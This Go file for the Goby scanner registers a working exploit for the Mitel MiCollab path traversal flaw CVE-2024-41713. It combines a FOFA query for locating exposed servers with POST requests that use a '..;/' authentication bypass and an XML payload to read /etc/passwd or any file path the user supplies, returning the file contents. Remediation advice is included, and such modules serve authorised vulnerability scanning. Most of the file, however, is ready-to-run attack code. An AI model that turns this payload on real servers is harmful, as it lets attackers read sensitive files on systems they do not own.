package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Mitel MiCollab /npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall File Read Vulnerability (CVE-2024-41713)",
    "Description": "<p>Mitel MiCollab is an enterprise collaboration platform developed by Mitel, Canada. This vulnerability exists in the NuPoint Unified Messaging (NPM) component of MiCollab. Due to authentication bypass and insufficient input validation, unauthenticated remote attackers can read arbitrary files via a path traversal attack. Successful exploitation may lead to unauthorized access, destruction, or deletion of user data and system configurations.</p>",
    "Product": "Mitel MiCollab",
    "Homepage": "https://www.mitel.com/products/micollab-collaboration-software",
    "DisclosureDate": "2024-10-22",
    "PostTime": "2024-12-11",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"MiCollab End User Portal\" && title=\"Redirecting\"",
    "GobyQuery": "body=\"MiCollab End User Portal\" && title=\"Redirecting\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows unauthenticated attackers to read arbitrary files via path traversal, potentially leading to sensitive information disclosure, data destruction, and tampering with system configurations.</p>",
    "Recommendation": "<p>It is recommended to immediately upgrade MiCollab to version 9.8 SP2 (9.8.2.12) or higher to fix this vulnerability. For users unable to upgrade immediately, Mitel provides a patch as a temporary solution, and it is advised to strengthen access control to critical files.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144303446"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "textarea",
            "value": "../../../etc/passwd",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "../../../etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1&isc_v=&isc_tnum=2",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "_transaction=<transaction xmlns:xsi=\"http://www.w3.org/2000/10/XMLSchema-instance\" xsi:type=\"xsd:Object\"><transactionNum xsi:type=\"xsd:long\">2</transactionNum><operations xsi:type=\"xsd:List\"><elem xsi:type=\"xsd:Object\"><criteria xsi:type=\"xsd:Object\"><reportName>../../../etc/passwd</reportName></criteria><operationConfig xsi:type=\"xsd:Object\"><dataSource>summary_reports</dataSource><operationType>fetch</operationType></operationConfig><appID>builtinApplication</appID><operation>downloadReport</operation><oldValues xsi:type=\"xsd:Object\"><reportName>x.txt</reportName></oldValues></elem></operations><jscallback>x</jscallback></transaction>&protocolVersion=1.0&__iframeTarget__=x"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1&isc_v=&isc_tnum=2",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "_transaction=<transaction xmlns:xsi=\"http://www.w3.org/2000/10/XMLSchema-instance\" xsi:type=\"xsd:Object\"><transactionNum xsi:type=\"xsd:long\">2</transactionNum><operations xsi:type=\"xsd:List\"><elem xsi:type=\"xsd:Object\"><criteria xsi:type=\"xsd:Object\"><reportName>{{{filePath}}}</reportName></criteria><operationConfig xsi:type=\"xsd:Object\"><dataSource>summary_reports</dataSource><operationType>fetch</operationType></operationConfig><appID>builtinApplication</appID><operation>downloadReport</operation><oldValues xsi:type=\"xsd:Object\"><reportName>x.txt</reportName></oldValues></elem></operations><jscallback>x</jscallback></transaction>&protocolVersion=1.0&__iframeTarget__=x"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read",
        "Ai"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-41713"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.8",
    "Translation": {
        "CN": {
            "Name": "Mitel MiCollab /npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall 文件读取漏洞（CVE-2024-41713）",
            "Product": "Mitel MiCollab",
            "Description": "<p>Mitel MiCollab 是加拿大 Mitel 公司推出的一款企业级协作平台。该漏洞存在于 MiCollab 的 NuPoint 统一消息 (NPM) 组件中，由于身份验证绕过和输入验证不足，未经身份验证的远程攻击者可以通过路径遍历攻击读取任意文件。成功利用可能导致未授权访问、破坏或删除用户的数据和系统配置。</p>",
            "Recommendation": "<p>建议立即升级 MiCollab 至 9.8 SP2 (9.8.2.12) 或更高版本，以修复该漏洞。对于无法立即升级的用户，可应用 Mitel 提供的补丁作为临时解决方案，同时加强对关键文件的访问控制。</p>",
            "Impact": "<p>该漏洞允许未经身份验证的攻击者通过路径遍历读取任意文件，可能导致敏感信息泄露、数据破坏和系统配置被篡改等严重后果。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "AI"
            ]
        },
        "EN": {
            "Name": "Mitel MiCollab /npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall File Read Vulnerability (CVE-2024-41713)",
            "Product": "Mitel MiCollab",
            "Description": "<p>Mitel MiCollab is an enterprise collaboration platform developed by Mitel, Canada. This vulnerability exists in the NuPoint Unified Messaging (NPM) component of MiCollab. Due to authentication bypass and insufficient input validation, unauthenticated remote attackers can read arbitrary files via a path traversal attack. Successful exploitation may lead to unauthorized access, destruction, or deletion of user data and system configurations.</p>",
            "Recommendation": "<p>It is recommended to immediately upgrade MiCollab to version 9.8 SP2 (9.8.2.12) or higher to fix this vulnerability. For users unable to upgrade immediately, Mitel provides a patch as a temporary solution, and it is advised to strengthen access control to critical files.</p>",
            "Impact": "<p>This vulnerability allows unauthenticated attackers to read arbitrary files via path traversal, potentially leading to sensitive information disclosure, data destruction, and tampering with system configurations.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "Ai"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}"
    },
    "VariablesOrder": [
        "filePath"
    ],
    "EditType": "fast",
    "PocId": "9976"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}